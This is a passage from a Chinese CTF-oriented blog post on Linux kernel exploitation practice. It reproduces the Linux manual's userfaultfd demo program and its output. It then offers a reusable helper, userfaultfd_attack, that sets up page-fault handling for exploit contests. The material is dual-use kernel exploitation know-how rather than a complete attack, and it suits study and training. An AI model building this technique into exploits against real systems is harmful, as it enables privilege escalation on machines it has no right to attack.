class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c">fault_handler_thread(<span class="hljs-type">void</span> *arg)<br>&#123;<br>   <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>   <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>   <span class="hljs-type">ssize_t</span> nread;<br><br>   uffd = (<span class="hljs-type">long</span>) arg;<br><br>   <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>   <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) &#123;<br>       page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                   MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>           errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">      file descriptor */</span><br><br>   <span class="hljs-keyword">for</span> (;;) &#123;<br><br>       <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>       <span class="hljs-type">int</span> nready;<br>       pollfd.fd = uffd;<br>       pollfd.events = POLLIN;<br>       nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>       <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>               <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>               (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>               (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>       <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>       nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>       <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>       <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>       <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">          region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">          is more obvious that each fault is handled separately. */</span><br><br>       <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>       fault_cnt++;<br><br>       uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>       <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">          So, round faulting address down to page boundary */</span><br><br>       uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                          ~(page_size - <span class="hljs-number">1</span>);<br>       uffdio_copy.len = page_size;<br>       uffdio_copy.mode = <span class="hljs-number">0</span>;<br>       uffdio_copy.copy = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>   &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>我们的整个手册上的测试用例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* userfaultfd_demo.c</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Licensed under the GNU General Public License version 2 or later.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg)    do &#123; perror(msg); exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">                       &#125; while (0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>   <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>   <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>   <span class="hljs-type">ssize_t</span> nread;<br><br>   uffd = (<span class="hljs-type">long</span>) arg;<br><br>   <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>   <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) &#123;<br>       page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                   MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>           errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">      file descriptor */</span><br><br>   <span class="hljs-keyword">for</span> (;;) &#123;<br><br>       <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>       <span class="hljs-type">int</span> nready;<br>       pollfd.fd = uffd;<br>       pollfd.events = POLLIN;<br>       nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>       <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>               <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>               (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>               (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>       <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>       nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>       <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>       <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>       <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">          region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">          is more obvious that each fault is handled separately. */</span><br><br>       <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>       fault_cnt++;<br><br>       uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>       <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">          So, round faulting address down to page boundary */</span><br><br>       uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                          ~(page_size - <span class="hljs-number">1</span>);<br>       uffdio_copy.len = page_size;<br>       uffdio_copy.mode = <span class="hljs-number">0</span>;<br>       uffdio_copy.copy = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>           errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>   &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>   <span class="hljs-type">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br>   <span class="hljs-type">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>   <span class="hljs-type">int</span> s;<br><br>   <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>       <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s num-pages\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>       <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>   &#125;<br><br>   page_size = sysconf(_SC_PAGE_SIZE);<br>   len = strtoul(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>) * page_size;<br><br>   <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br><br>   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>   <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>       errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>   uffdio_api.api = UFFD_API;<br>   uffdio_api.features = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>       errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>   <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">      demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">      actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">      the userfaultfd. */</span><br><br>   addr = mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE,<br>               MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>   <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>       errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address returned by mmap() = %p\n&quot;</span>, addr);<br><br>   <span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">      handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">      missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>   uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>   uffdio_register.range.len = len;<br>   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>       errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>   <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br><br>   s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br>   <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>       errno = s;<br>       errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Main thread now touches memory in the mapping, touching</span><br><span class="hljs-comment">      locations 1024 bytes apart. This will trigger userfaultfd</span><br><span class="hljs-comment">      events for all pages in the region. */</span><br><br>   <span class="hljs-type">int</span> l;<br>   l = <span class="hljs-number">0xf</span>;    <span class="hljs-comment">/* Ensure that faulting address is not on a page</span><br><span class="hljs-comment">                  boundary, in order to test that we correctly</span><br><span class="hljs-comment">                  handle that case in fault_handling_thread() */</span><br>   <span class="hljs-keyword">while</span> (l &lt; len) &#123;<br>       <span class="hljs-type">char</span> c = addr[l];<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Read address %p in main(): &quot;</span>, addr + l);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>, c);<br>       l += <span class="hljs-number">1024</span>;<br>       usleep(<span class="hljs-number">100000</span>);         <span class="hljs-comment">/* Slow things down a little */</span><br>   &#125;<br><br>   <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>情况如下：</p>
<img src="/2023/06/24/Linux-Kernel-0x02-Practice/userfaultfd_demo.png" srcset="/img/loading.gif" lazyload class="">

<p>我们可以参考到，在mmap之后也就是最上面的红线所得到的地址，我们在第一次访问他时出现了缺页异常，因此我们的轮询线程检测到我们之前定义的监控范围内出现异常，这使得该函数可以继续运行，因此将该内存区域填充A，所以在我们处理完了用户版的缺页异常后，该内存区域内全是A。</p>
<p>说了这么多我们会发现利用他是如此繁琐的一个过程，所以干脆咱们现在来写一个userfaultfd的万能板子，到时候写题就不需要重新回顾这些变量名了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span>         </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg) do&#123; perror(msg); exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">                    &#125; while(0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">userfaultfd_attack</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span>&#123;<br>  <span class="hljs-type">long</span> uffd;<br>  <span class="hljs-type">pthread_t</span> thr;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>  <span class="hljs-type">int</span> s;<br><br>  <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>  <span class="hljs-keyword">if</span>(uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>  uffdio_api.api = UFFD_API;<br>  uffdio_api.features = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br>  uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>  uffdio_register.range.len = len;<br>  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>  <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>  s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd);<br>  <span class="hljs-keyword">if</span>(s != <span class="hljs-number">0</span>)&#123;<br>    errno = s;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>有了上面的代码，我们就可以只需要使用<code>userfaultfd_attack(addr, len, handler)</code>就可以避免刚才咱们的一系列初始化步骤了，之后就是比较重要的handler函数的编写，这一部分更主要的是靠我们在赛时自行思考diy，这里给出较为通用的模板，也就是linux手册上面的，如下：</p>
